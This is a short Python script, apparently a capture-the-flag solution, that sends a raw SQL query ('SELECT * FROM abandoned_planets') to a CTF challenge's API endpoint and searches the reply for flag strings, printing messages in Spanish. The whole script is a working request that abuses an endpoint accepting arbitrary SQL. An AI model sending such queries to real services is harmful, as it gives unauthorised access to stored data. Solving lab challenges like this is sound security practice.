import requests
import re

url = "https://planets.ctf.zone/api.php"

payload = {
    "query": "SELECT * FROM abandoned_planets"
}

headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
}

try:
    response = requests.post(url, data=payload, headers=headers)
    text = response.text
    flag = re.findall(r"flag\{.*?\}", text)

    if flag:
        print("Flags encontradas:")
        print(flag)
    else:
        print("No se encontro ninguna flag")

except requests.RequestException as e:
    print("Error en la solicitud:", e)
